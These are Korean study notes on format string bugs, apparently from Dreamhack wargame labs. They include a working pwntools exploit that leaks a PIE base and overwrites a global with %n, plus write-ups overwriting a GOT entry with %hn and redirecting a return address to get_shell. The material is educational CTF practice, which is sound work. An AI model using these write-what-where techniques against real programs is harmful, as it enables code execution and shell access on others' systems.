- **포맷 스트링(Format String)**: `printf`를 비롯한 포맷 스트링 함수들이 파싱하여 처리하는 문자열.
- **포맷 스트링 버그(Format String Bug, FSB)**: 프로그래머가 포맷 스트링 함수를 잘못 사용하여 발생하는 버그. 공격자에 의해 스택 읽기, 임의 주소 쓰기, 임의 주소 읽기에 사용될 수 있음.
- **형식 지정자(Format Specifier)**: 포맷 스트링에 대입되는 인자의 형식을 지정함. `%d`, `%x`, `%u`, `%s`, `%n` 등이 있음.

# **익스플로잇 설계**

## **1. changeme 주소 구하기**

`changeme` 의 값을 조작하려면 해당 변수의 주소를 먼저 알아내야 합니다. 바이너리에는 PIE 보호 기법이 적용되어 있으므로, 전역 변수인 `changeme` 의 주소는 실행할 때마다 바뀝니다. 따라서 PIE 베이스 주소를 먼저 구하고, 그 주소를 기준으로 `changeme` 의 주소를 계산해야 합니다.

## **2. changeme를 1337로 설정하기**

`get_string` 으로 `changeme` 의 주소를 스택에 저장하면, `printf` 함수에서 `%n` 으로 `changeme` 의 값을 조작할 수 있습니다. 1337바이트의 문자열을 미리 출력하고, 위 방법으로 `changeme` 에 값을 쓰면 `changeme` 를 1337로 설정할 수 있습니다.

# **changeme 주소 구하기**

`disassemble main` 명령어를 사용해 `printf` 함수가 호출되는 오프셋을 찾고 해당 위치에 브레이크포인트를 설정합니다. `run` 명령어로 프로그램을 실행하면 `get_string` 함수에서 입력을 받습니다. 특정한 값을 입력하면 다음과 같이 `printf` 함수를 호출하기 직전에 브레이크포인트가 걸립니다.

# **Format String Bug**

**보호 기법🛡️**

PIE, NX를 포함한 보호 기법이 적용되어 있습니다. 카나리는 발견되지 않았으나 SFP나 반환 주소를 변조할 만한 스택 버퍼 오버플로우 취약점이 존재하지 않아 큰 의미는 없습니다

## **코드 분석 🔎**

예제에서는 `get_string` 함수를 통해 `buf` 에 32바이트 입력을 받습니다. 사용자가 입력한 `buf` 를 `printf` 함수의 인자로 직접 사용하므로 포맷 스트링 버그 취약점이 발생합니다.

# **changeme 덮어쓰기**

`changeme` 변수의 주소를 알고, 1337의 길이를 갖는 문자열도 출력할 수 있으므로, 다음과 같은 포맷 스트링을 구성하면 `changeme`의 값을 1337로 쓸 수 있습니다. 포맷 스트링을 구성하고, 익스플로잇을 실행하면 아래 실행 결과와 같이 `good`이 출력됩니다.

```python
#!/usr/bin/env python3
# Name: get_changeme.py
from pwn import *

def slog(n, m): return success(': '.join([n, hex(m)]))

p = process('./fsb_overwrite')
elf = ELF('./fsb_overwrite')

# [1] Get Address of changeme
p.sendline(b'%15$p') # FSB
leaked = int(p.recvline()[:-1], 16)
code_base = leaked - 0x1293
changeme = code_base + elf.symbols['changeme']

slog('code_base', code_base)
slog('changeme', changeme)

# [2] Overwrite changeme
payload = b'%1337c' # 1337을 min width로 하는 문자를 출력해 1337만큼 문자열이 사용되게 합니다.
payload += b'%8$n' # 현재까지 사용된 문자열의 길이를 8번째 인자(p64(changeme)) 주소에 작성합니다.
payload += b'A'*6 # 8의 배수를 위한 패딩입니다.
payload = payload + p64(changeme) # 페이로드 16바이트 뒤에 changeme 변수의 주소를 작성합니다.

p.sendline(payload)

p.interactive()
```

//

basic exploitation 002

예제대로 진행 

코드를 보면 

main 함수 부분을 보면 printf(buf); 코드가 있는 것을 볼 수 있다.

이는 포맷 스트링 버그를 일으킬 수 있다.

exit의 GOT에 get_shell함수의 시작 주소를 넣어 exit(0);가 실행될 때 get_shell 함수가 실행될 수 있도록 하면 될 것이다.

exit_GOT : 0x8048476
get_shell: 0x8048609
이제 exit_GOT에 get_shell함수의 시작 주소를 넣어야 되는데, 상위 2바이트는 0x0804로 같은 것을 볼 수 있다.
따라서 하위 2바이트만 0x8609로 덮어 주면 되는데, 이를 partial overwrite라고 하며, %hn를 이용하면 된다.

처음 입력한 %p가 앞의 aaaa를 가리키는 것을 볼 수 있다.

0x8609 = 34313이고, 앞에 주소를 적어 줌으로써 4바이트를 사용하였으므로 34313 - 4 = 34309를 넣어 주면 된다.

![basic_exploitation_002.jpg](https://github.com/JoWoonJi/Dreamhack_Wargame/blob/main/SystemHacking/img/basic_exploitation_002.jpg)

플래그 획득

//

exit_GOT : 0x8048476

get_shell: 0x8048609

이제 exit_GOT에 get_shell 함수의 시작 주소를 넣어야 되는데, 상위 2바이트는 0x0804로 같은 것을 볼 수 있다.

따라서 하위 2바이트만 0x8609로 덮어 주면 되는데, 이를 partial overwrite라고 하며, %hn를 이용하면 된다.

basic exploitation 003

002와 비슷한 로직에 + 버퍼오버플로우 

FSB를 이용해서 heap_buf에 %[stack_buf~RET]c + get_shell을 넣고 sprintf() 함수를 이용해서 버퍼 오버플로우를 발생시켜서 RET 값을 get_shell 함수의 주소로 변조 

buf ~ RET 까지 거리는 156
156 = 0x98 + 0x4

![basic_exploitation_003.jpg](https://github.com/JoWoonJi/Dreamhack_Wargame/blob/main/SystemHacking/img/basic_exploitation_003.jpg)

플래그 획득
